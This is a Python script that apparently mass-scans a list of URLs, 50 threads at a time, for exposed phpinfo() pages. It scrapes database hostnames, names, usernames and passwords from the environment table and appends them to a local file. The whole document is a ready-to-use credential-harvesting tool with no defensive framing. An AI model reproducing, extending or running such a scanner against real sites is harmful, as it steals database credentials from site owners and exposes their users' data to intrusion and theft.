import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def process_url(url):
    try:
        response = requests.get(url)
        if 'phpinfo()' in response.text:
            soup = BeautifulSoup(response.content, 'html.parser')
            data = {}
            for tr in soup.find_all('tr'):
                td_e = tr.find('td', class_='e')
                if td_e is not None and td_e.text.strip() in nama_variabel:
                    td_v = tr.find('td', class_='v')
                    if td_v is not None:
                        data[td_e.text.strip()] = td_v.text.strip()

            if 'DB_DATABASE' in data:
                db_database = data['DB_DATABASE']
            elif 'DB_NAME' in data:
                db_database = data['DB_NAME']
            else:
                db_database = ''

            if 'DB_USERNAME' in data:
                db_username = data['DB_USERNAME']
            elif 'DB_USER' in data:
                db_username = data['DB_USER']
            else:
                db_username = ''

            if 'DB_PASSWORD' in data:
                db_password = data['DB_PASSWORD']
            elif 'DB_PASS' in data:
                db_password = data['DB_PASS']
            else:
                db_password = ''

            db_host = data.get('DB_HOST', '')

            with open('foundinfo.txt', 'a') as f:
                f.write(f"{url}|{db_database}|{db_username}|{db_password}|{db_host}\n")

            print(f"\033[92mfound {url}\033[0m")
        else:
            print(f"\033[91mnot phpinfo{url}\033[0m")
    except:
        print(f"\033[91merror  {url}\033[0m")

if __name__ == '__main__':
    with open('list.txt', 'r') as f:
        urls = [line.strip() for line in f.readlines()]

    nama_variabel = ['DB_HOST', 'DB_PASSWORD', 'DB_PASS', 'DB_USERNAME', 'DB_USERNAME', 'DB_USER', 'DB_DATABASE', 'DB_NAME']

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(process_url, urls)
